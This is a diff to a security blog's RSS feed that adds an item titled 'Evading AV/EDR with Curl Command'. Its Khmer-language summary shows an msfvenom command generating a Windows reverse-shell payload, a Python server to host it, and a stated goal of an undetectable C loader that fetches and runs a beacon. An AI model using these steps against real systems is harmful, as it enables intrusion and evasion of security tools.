@@ -14,11 +14,55 @@
     <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
     <webMaster>thiklife403@gmail.com (Thik)</webMaster>
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
-    <lastBuildDate>Tue, 27 Jun 2023 21:01:06 +0700</lastBuildDate>
+    <lastBuildDate>Thu, 29 Jun 2023 21:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/en/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
     
 
+      
+      <item>
+        <title>Evading AV/EDR with Curl Command</title>
+        <link>https://thiklab.com/en/posts/evading-avedr-with-c-curl-command/</link>
+        <pubDate>Thu, 29 Jun 2023 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Thu, 29 Jun 2023 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/evading-avedr-with-c-curl-command/</guid>
+        <description>ខ្លីៗអំពីការ Bypass AV/EDR តាមរយៈពាក្យបញ្ជា Curl ដោយប្រើប្រាស់ភាសា C ។
+Generate Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាឯកសារ Raw គោលដៅលើម៉ាស៊ីន 64 bit ។
+បញ្ជាក់៖ Payload នេះដំណើរការតែក្នុងម៉ាស៊ីនវីនដូ ៨/10/11 ឡើងប៉ុណ្ណោះ ។
+1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f raw -o cat.bin   Live Payload ក្រោយពីបង្កើត Payload រួចយើងបង្កើត Server ដើម្បីបង្ហោះវាក្នុងគោលបំណងទាញយកមកប្រើប្រាស់វិញនៅជំហ៊ានបន្ទាប់ ។
+1  python3 -m http.server -d payloadDir 8000   PWN The Code តស់ចាប់ផ្ដើមបង្កើត FUD Payload ដោយប្រើប្រាស់ពាក្យបញ្ជា Curl ក្នុងភាសារ C ដើម្បីទាញយក Beacon និងបើកដំណើរការពីចំងាយ ។</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>c-shellcode</category>
+            
+          
+            
+              <category>metasploit</category>
+            
+          
+        
+        
+          
+            
+              <category>Evading</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
       
       <item>
         <title>Evading AV/EDR with Junk Bytes</title>
